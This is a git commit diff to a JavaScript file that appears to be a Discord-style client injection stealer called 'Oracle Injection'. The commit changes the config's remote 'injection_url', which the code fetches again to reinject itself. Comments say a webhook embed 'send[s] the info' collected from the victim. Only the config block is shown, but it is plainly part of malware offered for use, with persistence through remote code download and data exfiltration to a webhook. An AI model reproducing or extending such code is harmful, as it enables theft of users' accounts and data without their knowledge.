5b4025053677aa448edfb46ecd0dcafc7753d680
mte <72248782+mte0@users.noreply.github.com>
2022-05-25 00:02:05 +1200

    Update oclean-25may2022.js

--- oclean-25may2022.js
+++ oclean-25may2022.js
@@ -13,7 +13,7 @@ const config = {
   embed_name: "Oracle Injection", //name of the webhook thats gonna send the info
   embed_icon: "https://media.discordapp.net/attachments/970982305021706303/971383656453144627/OracleLogo.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 3553599, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "https://raw.githubusercontent.com/mte0/g/main/oclean-25may2022.js", //injection url for when it reinjects
+  injection_url: "https://github.com/mte0/g/raw/main/oclean-25may2022.js", //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
